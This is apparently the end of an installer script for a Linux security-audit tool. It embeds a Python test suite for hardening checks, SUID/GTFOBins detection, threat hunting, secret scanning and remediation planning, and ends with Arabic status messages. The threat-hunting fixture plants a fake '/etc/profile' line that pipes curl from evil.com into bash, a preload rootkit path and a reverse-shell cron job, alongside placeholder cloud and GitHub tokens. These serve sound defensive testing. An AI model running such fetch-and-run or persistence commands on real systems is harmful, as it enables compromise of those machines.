f1 = Finding(severity="critical", title="Test Finding", detail="detail", fix="remedy")
check("finding acts like dict", f1["severity"] == "critical" and f1.get("title") == "Test Finding")
check("deterministic id generated", len(f1["id"]) == 16)

print("\n[2] CIS Hardening Engine with FakeSystem")
fake_sys = FakeSystem(
    files={"/etc/shadow": "root:x:...", "/proc/mounts": "none /dev/shm tmpfs rw 0 0"},
    sysctls={"net.ipv4.ip_forward": "1", "fs.suid_dumpable": "1", "kernel.randomize_va_space": "0"}
)
he = HardeningEngine(sys_reader=fake_sys)
findings = he.audit_all()
titles = [f["title"] for f in findings]
check("detects insecure ip_forward", any("net.ipv4.ip_forward" in t for t in titles))
check("detects disabled ASLR", any("ASLR" in t for t in titles))
check("detects insecure /dev/shm mount", any("/dev/shm" in t for t in titles))

print("\n[3] SUID Intelligence & GTFOBins")
suid_intel = SuidIntelligence(sys_reader=fake_sys)
suid_findings = suid_intel.audit_suid(["/usr/bin/find", "/bin/nano", "/usr/bin/safe_custom_app"])
check("flags known GTFOBins binaries", len(suid_findings) == 2)
check("attack ID mapped", any("T1548.001" in f["attack_ids"] for f in suid_findings))

print("\n[4] Threat Hunter (Backdoors & Persistence)")
fake_hunter_sys = FakeSystem(
    files={
        "/etc/ld.so.preload": "/lib/evil_rootkit.so",
        "/etc/profile": "curl -s http://evil.com/x.sh | bash",
        "/etc/cron.d/malicious": "* * * * * root /tmp/reverse_shell.sh",
    }
)
hunter = ThreatHunter(sys_reader=fake_hunter_sys)
hunt_findings = hunter.hunt_all()
hunt_titles = [f["title"] for f in hunt_findings]
check("detects ld.so.preload rootkit", any("ld.so.preload" in t for t in hunt_titles))
check("detects bashrc/profile reverse shell", any("نمط باب خلفي" in t for t in hunt_titles))
check("detects cron referencing /tmp", any("Cron" in t for t in hunt_titles))

print("\n[5] Secret Scanner & Shannon Entropy")
scanner = SecretScanner(sys_reader=fake_sys)
entropy = scanner.shannon_entropy("randomSecretWithHighEntropy1234567890!@#")
check("high entropy calculated", entropy > 4.0)
masked = scanner.mask_secret("ghp_1234567890abcdefghijklmnopqrstuvwxyz")
check("secret masked properly", masked.startswith("ghp_") and masked.endswith("wxyz") and "..." in masked)

fake_secret_sys = FakeSystem(
    files={"/home/user/.env": "AWS_KEY=AKIAIOSFODNN7EXAMPLE\nGITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz"}
)
sec_scanner = SecretScanner(sys_reader=fake_secret_sys)
sec_findings = sec_scanner.scan_path("/home/user/.env")
check("flags AWS and GitHub secrets", len(sec_findings) == 2)

print("\n[6] Risk Evaluation & What-If Simulation")
test_findings = [
    Finding(severity="critical", title="Crit 1", fix="sudo sysctl -w net.ipv4.ip_forward=0"),
    Finding(severity="high", title="High 1", fix="sudo chmod 640 /etc/shadow"),
    Finding(severity="medium", title="Med 1", fix="fix_med"),
]
eval_res = RiskEngine.evaluate(test_findings)
check("risk score deducted from 100", eval_res["score"] < 70)
check("grade calculated", eval_res["grade"] in ("B", "C", "D", "F"))

what_if = RiskEngine.simulate_what_if(test_findings, "sudo sysctl -w net.ipv4.ip_forward=0")
check("what-if score gains points", what_if["score_gain"] > 0)

print("\n[7] ATT&CK Engine & Chokepoint Reasoning")
att = AttackEngine()
for tf in test_findings:
    att.enrich_finding(tf)
chokepoints = att.chokepoint_analysis(test_findings)
check("chokepoints identified", len(chokepoints) > 0)
check("top chokepoint has fix_cmd", "fix_cmd" in chokepoints[0])

print("\n[8] Remediation Bash Planner")
bash_script = RemediationPlanner.generate_bash_script(test_findings)
check("script contains dry-run support", "--dry-run" in bash_script)
check("script contains set -euo pipefail", "set -euo pipefail" in bash_script)
check("script includes remediation commands", "sysctl" in bash_script)

print(f"\n{'='*50}\nTOTAL V5 TESTS: {passed} passed, {failed} failed\n{'='*50}")
sys.exit(1 if failed else 0)
EOF

# ==============================================================================
# 18. تشغيل الفحوصات والتحقق البرمجي التام
# ==============================================================================
echo -e "\n${CYAN}[*] التحقق من صحة جميع ملفات Python برمجياً (py_compile)...${NC}"
python3 -m py_compile $(find . -name "*.py")
echo -e "${GREEN}[✓] جميع ملفات Python سليمة برمجياً 100%.${NC}"

echo -e "\n${CYAN}[*] تشغيل حزمة اختبارات V5 الجديدة...${NC}"
python3 tests/test_v5_suite.py

echo -e "\n${CYAN}[*] تشغيل عينة من اختبارات التكامل الحالية...${NC}"
python3 tests/test_system_new.py
python3 tests/test_intelligence_new.py

echo -e "\n${GREEN}======================================================================"
echo -e "  🎉  تمت ترقية وتثبيت AI AYFAM v5 بنجاح فائق!"
echo -e "======================================================================${NC}"
echo -e "الأوامر الجديدة المتاحة:"
echo -e "  ${YELLOW}ayfam --audit${NC}        → تدقيق تحصين عميق بنمط CIS Benchmark"
echo -e "  ${YELLOW}ayfam --hunt${NC}         → صيد التهديدات، الاستمرارية، والأبواب الخلفية"
echo -e "  ${YELLOW}ayfam --secrets${NC}      → فحص تسريب الأسرار والمفاتيح بإنتروبيا شانون"
echo -e "  ${YELLOW}ayfam --plan${NC}         → توليد سكريبت معالجة Bash آمن مع Dry-run"
echo -e "  ${YELLOW}ayfam --html-report${NC}  → إنشاء تقرير HTML تفاعلي متقدم بدون إنترنت"
echo -e "  ${YELLOW}ayfam${NC}                → وضع المحادثة الذكي (يدعم النوايا الجديدة)"
echo ""
EOF

chmod +x install_v5.sh
